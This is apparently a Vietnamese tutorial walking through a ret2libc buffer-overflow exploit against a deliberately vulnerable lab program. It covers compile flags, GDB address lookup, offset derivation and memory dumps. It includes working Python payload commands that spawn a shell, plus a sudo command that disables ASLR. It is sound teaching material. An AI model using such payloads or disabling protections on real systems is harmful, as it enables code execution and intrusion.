```text
BUFFER (64 BYTES) <-- ESP
EBP
RET ADDR (PRINTF("Done.\n"))
ARGV[1]
EBP <-- EBP
RET ADDR
ARGC
ARGV
```

# Hướng dẫn chi tiết `vuln.c`

Tài liệu này giải thích phần `vuln.c` trong `new thing.txt`, từ lệnh shell đầu tiên cho đến lúc kiểm tra shell cuối cùng. Làm theo thứ tự các mục. Lệnh ghi **Shell** được nhập trong Ubuntu/WSL. Lệnh ghi **GEF** được nhập tại prompt `gef➤` bên trong GDB.

Bản chạy được mô tả ở đây đã được biên dịch và kiểm tra bằng đúng các compiler flag bên dưới. Với chính bản build này, padding đã xác nhận là **68 bytes**, và breakpoint đã xác nhận là **`vuln+0x15` tại `0x0804919b`**.

## Tấn công này làm gì, và vì sao nó quan trọng?

Trước tiên, hãy hình dung chương trình bình thường làm gì: `main` gọi `vuln` để copy input, rồi chờ `vuln` return để `main` in `Done.`. `buffer` 64 byte là một vùng nhớ nhỏ bên trong `vuln`. Stack là vùng nhớ chương trình dùng khi gọi function; trong đó có buffer và một địa chỉ đã lưu để CPU biết cần chạy tiếp ở đâu khi `vuln` kết thúc.

Lỗi ở đây là `strcpy` copy toàn bộ input vào `buffer` mà không kiểm tra input có vừa hay không. Nếu input quá dài, các byte dư tràn khỏi buffer và ghi đè địa chỉ đã lưu đó. Lỗi này gọi là **buffer overflow**. Địa chỉ đã lưu gọi là **return address** của function. Thay đổi nó sẽ đổi bước tiếp theo của chương trình; thao tác đó gọi là **control-flow hijack**.

Luồng bình thường và luồng bị thay đổi:

```text
Bình thường:
main -> vuln copy input -> vuln return về main -> in "Done."
Tấn công:
main -> vuln copy input dài -> saved return address bị thay đổi -> vuln return đến system() -> system khởi động /bin/sh
```

Payload là input dài lấp đầy buffer và thay địa chỉ đã lưu. Mỗi phần có một nhiệm vụ:

- **68 byte `A`:** padding. 64 byte đầu lấp đầy `buffer`; 4 byte tiếp theo ghi đè saved EBP. Chúng là data, không phải instruction và không được CPU thực thi.
- **Địa chỉ `system()`:** thay saved return address. `system()` là function đã có sẵn trong C library (`libc`); nó chạy một command.
- **Địa chỉ `exit()`:** nằm trong stack slot kế tiếp. Khi `system()` kết thúc, địa chỉ này bảo chương trình thoát gọn thay vì tiếp tục ở một địa chỉ không hợp lệ.
- **Địa chỉ `"/bin/sh"`:** cho `system()` biết command cần chạy là khởi động shell.

Vậy mục đích của payload không phải làm các byte `A` chạy. Nó đổi saved return address để CPU chuyển sang code libc có sẵn, rồi xếp các giá trị tiếp theo trong stack theo cách `system()` mong đợi.

### Ghép payload vào đúng các dòng trong sơ đồ

Đếm các dòng của sơ đồ từ trên xuống. Trước khi overflow, các dòng cho biết stack slot thường chứa gì. Payload thay nội dung các slot đó:

1. **`BUFFER (64 BYTES) <-- ESP`:** 64 byte `A` đầu lấp đầy buffer.
2. **`EBP`:** 4 byte `A` tiếp theo ghi đè saved EBP của `vuln`.
3. **`RET ADDR (PRINTF("Done.\n"))`:** 4 byte kế tiếp là địa chỉ `system()`. `ret` của `vuln` dùng nó làm địa chỉ instruction tiếp theo.
4. **`ARGV[1]`:** 4 byte kế tiếp là địa chỉ `exit()`. Sau khi `vuln` return đến `system()`, `system()` coi stack word này là return address của chính nó.
5. **`EBP <-- EBP`:** 4 byte kế tiếp là địa chỉ chuỗi `/bin/sh`. `system()` coi stack word này là argument đầu tiên. Slot này bình thường chứa saved EBP của `main`; payload ghi đè nó.

Nhãn trong sơ đồ mô tả các slot ban đầu; sau overflow, nội dung dòng 3–5 đã đổi thành các giá trị payload ở trên. Thêm một chi tiết: `strcpy` copy thêm byte NUL kết thúc sau 80 byte payload. Byte NUL này rơi vào byte đầu tiên của dòng 6, slot saved return address của `main`. Trong payload này, `system()` return đến `exit()`, function này kết thúc process nên chương trình không dùng lại return address đã bị đổi đó của `main`.

**Vì sao shell prompt xuất hiện trong cùng terminal?** `system()` khởi động `/bin/sh`. Shell đó dùng chung bàn phím và màn hình với chương trình, nên prompt `$` xuất hiện trong terminal hiện tại. Nó không cần mở cửa sổ mới. Gõ `id` để xem shell chạy bằng user nào; trong lab này vẫn là `pc` (UID 1000), không phải root.

**Ví dụ cụ thể về tác hại:** tưởng tượng một web service chạy bằng tài khoản giới hạn tên `www-data`. Nếu service có lỗi này và nhận được input do attacker kiểm soát, input có thể khiến service khởi động shell với quyền `www-data`. Giả sử `www-data` được phép đọc file cấu hình website và file đó chứa database password. Khi đó attacker có thể tìm cách truy cập dữ liệu mà database account được phép đọc. Attacker chỉ có quyền của service account; riêng lỗi này không tự biến họ thành root. Trong lab này process chạy bằng `pc`, và `id` cho thấy UID là 1000.

## 1. Hiểu sơ đồ trước

Đọc sơ đồ từ trên xuống. Trong trạng thái dừng này, ESP trỏ vào buffer ở đầu sơ đồ. Mỗi slot tiếp theo trong sơ đồ có địa chỉ số lớn hơn.

- `BUFFER (64 BYTES) <-- ESP`: mảng local 64 byte nằm ở đầu sơ đồ. Tại breakpoint sau khi copy, ESP trỏ vào byte đầu tiên của mảng.
- `EBP`: slot saved EBP trong frame của `vuln`. Giá trị chứa trong slot này là EBP của `main`. Bản thân thanh ghi EBP trỏ tới slot chứa giá trị đã lưu đó.
- `RET ADDR (PRINTF("Done.\n"))`: cách ghi tắt cho đường đi của chương trình khi chạy bình thường sau khi `vuln` return. Chính xác hơn, saved return address là địa chỉ của instruction ngay sau `call vuln`; sau đó `main` mới chạy đến phần in `Done`.
- `ARGV[1]`: `main` truyền một pointer tới `argv[1]` vào `vuln` làm tham số `input`. `strcpy` copy các byte của chuỗi từ pointer đó vào buffer.
- `EBP <-- EBP`: slot saved EBP của `main`, và thanh ghi EBP của `main` trỏ tới slot này. Đây không phải hai word EBP riêng biệt.
- `RET ADDR`: return address của chính `main`, trỏ về caller trong C runtime.
- `ARGC` và `ARGV`: các tham số của `main`. Trong bản build 32-bit này, `[EBP_m+8]` là `argc`, `[EBP_m+12]` là `argv`. `EBP_m` là EBP của `main`; `EBP_v` là EBP của `vuln`.

Cụm “top of stack” và “địa chỉ cao hơn” nói về hai thứ khác nhau. ESP trỏ vào buffer ở đầu sơ đồ. Khi đi xuống sơ đồ, giá trị địa chỉ số tăng lên. `sub esp,0x40` trừ 64 khỏi ESP, khiến giá trị địa chỉ của ESP nhỏ hơn; điều đó không có nghĩa là phải vẽ buffer ở cuối sơ đồ.

### Layout thực tế trong `vuln`

Disassembly của bản build này đặt buffer tại `[EBP_v-0x40]`. Slot saved EBP ở `[EBP_v]`; saved return address ở `[EBP_v+4]`; input pointer của `vuln` ở `[EBP_v+8]`.

```text
Đi xuống sơ đồ thì địa chỉ tăng:

Đầu buffer              [EBP_v-0x40]  <-- ESP tại breakpoint
Cuối buffer 64 byte     [EBP_v-1]
saved EBP của main       [EBP_v]
saved return address     [EBP_v+4]
input pointer của vuln   [EBP_v+8]
saved EBP của main       [EBP_v+12]   <-- EBP_m trong bản build này
return address của main  [EBP_v+16]
main argc                [EBP_v+20]   == [EBP_m+8]
main argv                [EBP_v+24]   == [EBP_m+12]
```

Bản đồ này nối các nhãn trong sơ đồ với địa chỉ thật. `EBP_v` là địa chỉ nền, không phải nội dung của word saved EBP. Word tại `[EBP_v]` chứa giá trị `EBP_m`.

### Sau khi payload được copy

Payload gồm 68 byte `A`, tiếp theo là ba giá trị 4 byte. 64 byte đầu lấp đầy buffer; 4 byte tiếp theo ghi đè saved EBP. Các word tiếp theo lần lượt nằm vào saved return address, stack word kế tiếp và stack word sau nữa:

```text
Offset tính từ đầu buffer    Stack slot / giá trị
+76                          địa chỉ chuỗi /bin/sh (đối số của system)
+72                          exit() (return address của system)
+68                          system() (return address của vuln)
+64 đến +67                  4 byte A (saved EBP bị ghi đè)
+0 đến +63                   64 byte A (buffer)
+0                           <-- ESP tại breakpoint sau khi copy
```

Trong lần chạy đã kiểm tra, các word này là `0xf7dc8ce0` (`system`), `0xf7db52b0` (`exit`), và `0xf7f40167` (chuỗi `/bin/sh`). Các địa chỉ mẫu này có thể thay đổi; các offset mới mô tả layout.

## 2. Mở Ubuntu và vào thư mục lab

Nếu bạn đang ở Windows PowerShell, mở Ubuntu:

```powershell
wsl -d Ubuntu
```

Lệnh này mở shell bên trong WSL distribution Ubuntu. Prompt sẽ đổi từ PowerShell sang prompt Linux. Từ đây, nhập lệnh trong shell Linux trừ khi có ghi rõ là GEF.

Đi tới thư mục có `vuln.c`:

```bash
cd /mnt/d/Proj/Work/gdb-lab/ret2libc
```

`cd` đổi thư mục hiện tại. Có thể dùng `pwd` để xác nhận:

```bash
pwd
```

Thư mục mong đợi:

```text
/mnt/d/Proj/Work/gdb-lab/ret2libc
```

Các tên file tương đối trong các lệnh sau (`vuln.c`, `vuln.out`, `build_payload.py`) giả định bạn đang ở thư mục này.

## 3. Biên dịch chương trình

**Shell:**

```bash
gcc -m32 -g -fno-stack-protector -no-pie -fno-pie -mpreferred-stack-boundary=2 -o vuln.out vuln.c
```

Lệnh này biên dịch `vuln.c` và tạo file executable `vuln.out`.

- `gcc` chạy C compiler.
- `-m32` tạo executable 32-bit. Pointer và stack word của chương trình rộng 4 byte, dù WSL host báo kiến trúc `x86_64`.
- `-g` thêm debug information để GDB nhận diện function và source line.
- `-fno-stack-protector` tắt stack canary của compiler cho chương trình lab cố ý dễ bị lỗi này.
- `-no-pie` tắt kiểu link position-independent executable cho binary này. Nó giữ địa chỉ code của chính chương trình cố định; tự nó không tắt randomization của libraries.
- `-fno-pie` yêu cầu compiler không tạo position-independent code.
- `-mpreferred-stack-boundary=2` chọn stack alignment ưu tiên 4 byte trên target 32-bit này. Compiler flag có thể thay đổi stack layout và do đó thay đổi offset đo được.
- `-o vuln.out` đặt tên file đầu ra.
- `vuln.c` là file source đầu vào.

**Output mong đợi:** thường không có output. Nếu GCC quay lại prompt mà không báo lỗi, compile thành công. Nếu lỗi nhắc đến 32-bit startup files hoặc libraries bị thiếu, WSL cần được cài hỗ trợ build 32-bit trước khi tiếp tục.

Code dễ lỗi là `strcpy(buffer, input)`: `buffer` chỉ có chỗ cho 64 byte, nhưng `strcpy` không được truyền giới hạn đó. Chuỗi dài hơn sẽ tiếp tục ghi vào các stack slot kế bên.

## 4. Kiểm tra ASLR

Lệnh trong ghi chú là:

```bash
sudo sysctl kernel.randomize_va_space
```

Dạng lệnh này chỉ đọc setting, không thay đổi nó. Kết quả trong lab này là:

```text
kernel.randomize_va_space = 0
```

`0` nghĩa là Linux address-space randomization đang tắt. Setting này ảnh hưởng cả WSL environment, không chỉ `vuln.out`. Trong lần chạy đã kiểm tra, giá trị vốn đã là zero.

Chỉ dùng dạng ghi sau nếu thực sự cần đổi setting:

```bash
sudo sysctl -w kernel.randomize_va_space=0
```

`-w` nghĩa là ghi giá trị mới. `sudo` yêu cầu quyền administrator và có thể hỏi password WSL. Nếu lệnh chỉ đọc đã cho ra `0`, đừng chạy lệnh ghi; không cần đổi gì cả.

Nếu đã đổi setting cho demo, hãy khôi phục giá trị bạn dùng trước demo. `2` là giá trị phổ biến để bật đầy đủ address randomization:

```bash
sudo sysctl -w kernel.randomize_va_space=2
```

Đừng khôi phục một cách mù quáng nếu giá trị ban đầu khác. Chúng ta đã kiểm tra môi trường này và thấy nó vốn là `0`.

## 5. Tìm function trong disassembly

**Shell:**

```bash
objdump -d vuln.out | grep -A 12 "<vuln>:"
```

- `objdump -d vuln.out` dịch machine code trong executable thành văn bản assembly.
- Pipe `|` gửi output đó cho `grep`.
- `grep -A 12 "<vuln>:"` tìm dòng tên `vuln` và in thêm 12 dòng phía sau.

Đoạn quan trọng:

```text
08049186 <vuln>:
 8049186: 55                    push   %ebp
 8049187: 89 e5                 mov    %esp,%ebp
 8049189: 83 ec 40              sub    $0x40,%esp
 804918c: ff 75 08              push   0x8(%ebp)
 804918f: 8d 45 c0              lea    -0x40(%ebp),%eax
 8049192: 50                    push   %eax
 8049193: e8 ...                call   strcpy@plt
```

Instruction `lea -0x40(%ebp),%eax` tính địa chỉ buffer: `EBP-0x40`. `0x40` trong hệ hexadecimal bằng 64 hệ decimal, khớp với mảng 64 byte. `lea` tính địa chỉ; nó không đọc các byte bên trong buffer.

Lệnh `objdump` ngắn này giúp tìm function. Dùng toàn bộ disassembly trong GDB ở bước kế tiếp để xem các instruction sau `strcpy` và xác minh breakpoint.

## 6. Mở GDB và đọc toàn bộ function

**Shell:**

```bash
gdb -q ./vuln.out
```

`gdb` khởi động debugger. `-q` giảm bớt startup text. `./vuln.out` là chương trình GDB sẽ debug. Prompt `gef➤` cho biết GEF đã nạp và đang chờ lệnh debugger.

**GEF:**

```gdb
disas vuln
```

Lệnh này disassemble function tên `vuln`. Output đã xác minh:

```text
0x08049186 <+0>:     push   ebp
0x08049187 <+1>:     mov    ebp,esp
0x08049189 <+3>:     sub    esp,0x40
0x0804918c <+6>:     push   DWORD PTR [ebp+0x8]
0x0804918f <+9>:     lea    eax,[ebp-0x40]
0x08049192 <+12>:    push   eax
0x08049193 <+13>:    call   0x8049050 <strcpy@plt>
0x08049198 <+18>:    add    esp,0x8
0x0804919b <+21>:    nop
0x0804919c <+22>:    leave
0x0804919d <+23>:    ret
```

Các dòng này khớp với stack map như sau:

1. `push ebp` lưu giá trị EBP của caller lên stack.
2. `mov ebp,esp` làm EBP trỏ đến slot saved EBP. Trong sơ đồ, đây là quan hệ `EBP <-- EBP` bên trong frame của `vuln`.
3. `sub esp,0x40` dành ra 64 byte cho `buffer`. ESP trở thành địa chỉ byte đầu tiên của buffer.
4. `[ebp+0x8]` là input pointer argument của `vuln`. Nó trỏ tới chuỗi `argv[1]`.
5. `lea eax,[ebp-0x40]` tính địa chỉ đích, tức đầu `buffer`.
6. Hai instruction `push` đưa argument của `strcpy` lên stack: destination trước, source sau.
7. `call strcpy@plt` gọi hàm copy chuỗi. Bản thân `call` cũng đẩy một return address tạm lên stack để `strcpy` có thể return.
8. `add esp,0x8` bỏ hai argument 4 byte sau khi function kết thúc. ESP quay lại đầu buffer.
9. `nop` không làm gì. Đây là điểm dừng thuận tiện sau khi copy và trước `leave; ret`.
10. `leave` khôi phục ESP từ EBP rồi pop giá trị saved EBP.
11. `ret` pop saved return address vào instruction pointer.

### Tính địa chỉ breakpoint

Breakpoint target là `nop` ở `<+21>`. Offset nằm trong dấu ngoặc nhọn là decimal. Trong address expression của GDB, giá trị có prefix `0x` được viết ở dạng hexadecimal:

```text
21 decimal = 0x15 hexadecimal
function start + offset = 0x08049186 + 0x15 = 0x0804919b
```

Vì vậy breakpoint của bản build này là `*(vuln+0x15)`, địa chỉ `0x0804919b`. Giá trị `0x080491ab` trong ghi chú không phải địa chỉ của `nop` này; nó sẽ tương ứng với `vuln+0x25`. Giá trị `0x080491ab` đã cũ, không dùng cho disassembly này.

### Tính padding offset

Vị trí saved return address được suy ra từ function prologue và quy ước gọi hàm x86:

- `call vuln` của caller đẩy return address lên stack.
- `push ebp` lưu EBP của caller ngay bên dưới return address đó.
- `mov ebp,esp` làm EBP trỏ tới saved EBP.
- Vì vậy saved return address nằm cao hơn EBP một word 4 byte, tại `[EBP_v+4]`.
- `lea eax,[ebp-0x40]` cho biết buffer bắt đầu ở `[EBP_v-0x40]`.

Lấy địa chỉ return address trừ địa chỉ đầu buffer:

```text
(EBP_v + 4) - (EBP_v - 0x40)
= 4 + 0x40
= 0x44
= 68 bytes
```

Do đó offset là 68 byte. 64 byte `A` đầu lấp đầy `buffer`; 4 byte tiếp theo ghi đè saved EBP; byte kế tiếp bắt đầu ghi vào saved return address. Các argument `argc` và `argv` nằm trong frame của `main`, không cộng vào offset này.

## 7. Đặt breakpoint và chạy input vô hại

**GEF:**

```gdb
break *(vuln+0x15)
```

`break` tạo breakpoint. `vuln+0x15` là instruction address đã xác minh, tính tương đối từ đầu function. Dấu `*` yêu cầu GDB coi biểu thức là một địa chỉ. Thông báo dự kiến gần giống:

```text
Breakpoint 1 at 0x804919b: file .../vuln.c, line 8.
```

Số breakpoint có thể khác nếu đã có breakpoint khác. Điều cần kiểm tra là địa chỉ được resolve thành `0x804919b`.

Bây giờ chạy inferior với argument ngắn, vô hại:

```gdb
run AAAA
```

`run` khởi động chương trình dưới GDB. `AAAA` là `argv[1]` trong lần chạy này. Chuỗi chỉ có bốn byte nên cho phép chương trình gọi `strcpy` rồi dừng mà không overflow mảng local. Breakpoint sẽ dừng tại `nop` sau khi copy.

Các phần hữu ích nhất trong output GEF:

```text
$esp : 0xffffcfdc -> "AAAA"
$eip : 0x0804919b -> <vuln+0015> nop
```

`$eip` là instruction pointer; nó xác nhận chương trình dừng tại `nop`. `$esp` trỏ vào byte đầu tiên của buffer và GEF hiển thị chuỗi đã copy ở đó. Giá trị stack address tuyệt đối như `0xffffcfdc` có thể đổi giữa các lần chạy.

## 8. Tìm địa chỉ library trong process này

Chạy các lệnh này khi lần chạy `AAAA` đang tạm dừng tại breakpoint. Khi chương trình khởi động, shared libraries, gồm libc, đã được load.

**GEF:**

```gdb
print system
```

Output đã quan sát:

```text
$1 = {<text variable, no debug info>} 0xf7dc8ce0 <system>
```

Đây là địa chỉ hàm `system()` trong libc của process này: `0xf7dc8ce0`.

```gdb
print exit
```

Output đã quan sát:

```text
$2 = {<text variable, no debug info>} 0xf7db52b0 <exit>
```

Đây là địa chỉ của `exit()`: `0xf7db52b0`. Payload dùng nó làm địa chỉ return sau khi `system()` kết thúc.

```gdb
find &system,+99999999,"/bin/sh"
```

Lệnh tìm chuỗi `/bin/sh` trong vùng memory bắt đầu từ địa chỉ của `system`, quét tối đa 99.999.999 byte. Output lần chạy đã xác minh:

```text
0xf7f40167
warning: Unable to access ... bytes ... halting search.
1 pattern found.
```

Match tìm được ở `0xf7f40167`. Warning có nghĩa một phần vùng tìm kiếm đi qua memory GDB không thể đọc. Vì GDB đã báo tìm được một match, warning đó không xóa kết quả đã tìm thấy.

Ghi ba giá trị lại cùng nhau:

```text
system() = 0xf7dc8ce0
exit()   = 0xf7db52b0
/bin/sh  = 0xf7f40167
```

Đây là các giá trị mẫu của lần chạy đã xác minh, không phải hằng số dùng cho mọi máy. Nếu binary, libc hoặc điều kiện randomization thay đổi, hãy truy vấn lại rồi build payload với địa chỉ của process bạn đang dùng.

## 9. Tạo hai dạng lệnh payload

Mở Ubuntu shell thứ hai hoặc thoát GDB sau khi ghi lại các địa chỉ. Từ thư mục `ret2libc`, chạy:

```bash
python3 build_payload.py 0xf7dc8ce0 0xf7db52b0 0xf7f40167
```

Thứ tự argument là `system_addr`, `exit_addr`, rồi `binsh_addr`. Script đọc các giá trị này như chuỗi số hexadecimal. Nó đổi mỗi địa chỉ thành 4 byte theo little-endian rồi nối chúng sau `b"A" * OFFSET`.

Builder in ra:

```text
Offset (padding bytes): 68
Total payload length:   80 bytes
```

Phép tính là `68 + 4 + 4 + 4 = 80`: padding cộng ba giá trị 4 byte. Little-endian nghĩa là byte ít quan trọng nhất được đặt trước. Ví dụ `0xf7dc8ce0` được truyền thành các byte `e0 8c dc f7`.

### Dạng chạy trực tiếp

Builder in một lệnh tương tự:

```bash
python3 -c "import subprocess; subprocess.run(['./vuln.out', b'A'*68 + b'\xe0\x8c\xdc\xf7\xb0R\xdb\xf7g\x01\xf4\xf7'])"
```

Lệnh này khởi chạy `vuln.out` như một subprocess của Python. Nó **không** chạy chương trình vulnerable dưới GDB, nên breakpoint và memory inspection của GDB không áp dụng. Nếu chạy tương tác, shell được tạo sẽ nối với terminal; tại prompt của shell, gõ `id`, `pwd`, `uname -m`, rồi `exit`.

Để kiểm tra không tương tác, lệnh tương đương sau gửi các lệnh cho shell và capture output:

```bash
python3 -c "import subprocess; result=subprocess.run(['./vuln.out', b'A'*68 + bytes.fromhex('e08cdcf7b052dbf76701f4f7')], input=b'id\npwd\nuname -m\nexit\n', stdout=subprocess.PIPE, stderr=subprocess.STDOUT); print(result.stdout.decode(errors='replace')); print('exit code:', result.returncode)"
```

Output đã xác minh:

```text
uid=1000(pc) gid=1000(pc) groups=1000(pc),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),100(users)
/mnt/d/Proj/Work/gdb-lab/ret2libc
x86_64
Running...

exit code: 0
```

Shell chạy với user thường `pc`, UID 1000, không phải root. Lệnh kết thúc thành công với return code 0. `Running...` có thể xuất hiện sau output của shell vì output của chương trình cha bị buffer trong lúc shell chạy. `Done.` không được in: sau khi `system()` return, payload chuyển execution đến `exit()`.

### Dạng kiểm tra trong GDB

Builder cũng in một lệnh tương tự:

```gdb
run $(python3 -c 'import sys; sys.stdout.buffer.write(b"A"*68 + bytes.fromhex("e08cdcf7b052dbf76701f4f7"))')
```

Dùng lệnh này tại prompt GEF nếu muốn inspect payload trong GDB. Lệnh khởi chạy Python trong command `run` của GDB; Python ghi raw payload bytes ra stdout, còn `$(...)` truyền các byte đó làm argument của inferior. Khác với dạng chạy trực tiếp, chương trình vulnerable vẫn chạy dưới GDB.

## 10. Chạy payload dưới GDB và inspect memory

Trong GDB session ban đầu, lần chạy vô hại `run AAAA` đang tạm dừng. Nhập đầy đủ lệnh kiểm tra GDB mà builder in ra. Lệnh này bắt đầu một lượt chạy mới với argument dài; lượt chạy vô hại được thay thế.

Breakpoint sẽ dừng lần nữa. View tự động của GEF rút gọn chuỗi dài. Các điểm cần kiểm tra:

- `$eip` vẫn là `0x0804919b`, `nop` ngay sau `strcpy`.
- `$esp` trỏ vào chuỗi nhiều chữ `A`, tức đầu buffer đã copy.
- Trace có thể hiển thị giá trị `input` gây ngạc nhiên vì overflow cũng ghi đè slot argument `input`. Điều đó là dự kiến; ta đang kiểm tra đường return và các payload word.

Bây giờ yêu cầu GDB dump rõ ràng:

```gdb
x/32xw $esp
```

Đọc từng phần trong lệnh:

- `x` nghĩa là examine memory.
- `/32` nghĩa là hiển thị 32 item.
- Chữ `x` thứ hai nghĩa là in giá trị theo hexadecimal.
- `w` nghĩa là mỗi item là một word 4 byte trong chương trình 32-bit này.
- `$esp` là địa chỉ bắt đầu. Tại breakpoint này, nó trỏ vào byte đầu buffer.

Dump đã xác minh:

```text
0xffffcf8c:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffcf9c:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffcfac:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffcfbc:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffcfcc:     0x41414141      0xf7dc8ce0      0xf7db52b0      0xf7f40167
0xffffcfdc:     0xf7d9af00      0x00000002      0xffffd0a4      0xffffd0b0
```

Cách đếm các word quan trọng:

- Dòng đầu có bốn word, mỗi word là `0x41414141` (16 byte `A`).
- Ba dòng tiếp theo đưa tổng số lên 16 word (64 byte), đúng kích thước buffer.
- Word đầu của dòng thứ năm là word 17: bốn chữ `A` tiếp theo ghi đè saved EBP. Tổng padding: 17 × 4 = 68 byte.
- Word tiếp theo là `0xf7dc8ce0`: `system()` tại offset 68, saved return address đã bị ghi đè.
- Word tiếp là `0xf7db52b0`: `exit()` tại offset 72, địa chỉ return của `system()`.
- Word tiếp là `0xf7f40167`: địa chỉ chuỗi `/bin/sh` tại offset 76, argument của `system()`.

Cột bên trái cho biết stack address của từng dòng. Các stack address này thay đổi giữa các lần chạy. Payload word và offset mới là phần quan trọng. Dump xác nhận offset 68 đã tính từ disassembly.

## 11. Tiếp tục để vào shell

**GEF:**

```gdb
continue
```

`continue` tiếp tục inferior từ breakpoint. `ret` cuối `vuln` dùng return word đã bị ghi đè để bắt đầu chạy `system()`. Word kế tiếp cung cấp return address cho `system()` (`exit`); word sau nữa là argument (`/bin/sh`).

Output đã quan sát bắt đầu như sau:

```text
Continuing.
[Detaching after vfork from child process ...]
$
```

`$` là shell prompt. `system()` tạo một child process để chạy shell, nên GDB thông báo detach khỏi child. Không có instruction nào từ stack được thực thi; control được chuyển hướng đến code đã có sẵn trong libc.

Tại prompt `$`, nhập từng lệnh một:

```sh
id
```

Mong đợi: `uid=1000(pc) ...`. `id` cho biết shell chạy dưới tài khoản nào. Đây là shell của user thường; demo này không cần root.

```sh
pwd
```

Mong đợi: thư mục hiện tại. Trong lần chạy đã kiểm tra là `/mnt/d/Proj/Work/gdb-lab/ret2libc`.

```sh
uname -m
```

Mong đợi: `x86_64`. Đây là kiến trúc của WSL host. Chương trình vẫn là 32-bit vì được compile với `-m32`.

Cuối cùng nhập:

```sh
exit
```

Shell đóng lại. GDB báo:

```text
[Inferior 1 (process ...) exited normally]
```

Điều này xác nhận chain đã tới function `exit()` được cung cấp sau khi shell kết thúc.

## 12. Kiểm tra NX (không bắt buộc)

Thoát GDB, rồi chạy trong WSL shell để xem permission của stack trong ELF program header:

```bash
readelf -l vuln.out | grep -A1 GNU_STACK
```

Output liên quan:

```text
GNU_STACK ... RW ...
GNU_RELRO ... R ...
```

Trong output `readelf` này, `R` là read, `W` là write, `E` là execute. `GNU_STACK` có `RW` nhưng không có `E`, nghĩa là stack không executable. `grep -A1` in thêm một dòng sau `GNU_STACK`, vì thế header `GNU_RELRO` riêng biệt cũng xuất hiện.

## 13. Những chỗ trong ghi chú cần sửa

Với đúng compile command và disassembly trong hướng dẫn này:

- **Dùng 68 byte padding**, builder hiện báo `OFFSET = 68` và payload dài 80 byte.
- **Dùng `break *(vuln+0x15)`**, lệnh resolve thành `0x0804919b`. `nop` được hiển thị là `<+21>`; 21 decimal bằng `0x15` hexadecimal.
- **Không dùng `0x080491ab`** cho breakpoint đó. Nó là `vuln+0x25`, không phải địa chỉ của instruction `<+21>` đang hiển thị.
- GDB payload command chính xác là toàn bộ command mà `build_payload.py` hiện in ra. Đừng copy dòng bị cắt trong `new thing.txt`, dòng đó dừng giữa `bytes.fromhex("`.
- Các libc address tuyệt đối trong hướng dẫn này thuộc lần chạy đã xác minh. Hãy query lại trong GDB nếu binary, libc hoặc setting randomization thay đổi.

Quy tắc đơn giản: suy ra offset và breakpoint từ disassembly của binary hiện tại, dùng địa chỉ từ process hiện tại, rồi đối chiếu memory dump với các stack slot trong sơ đồ ở đầu tài liệu.
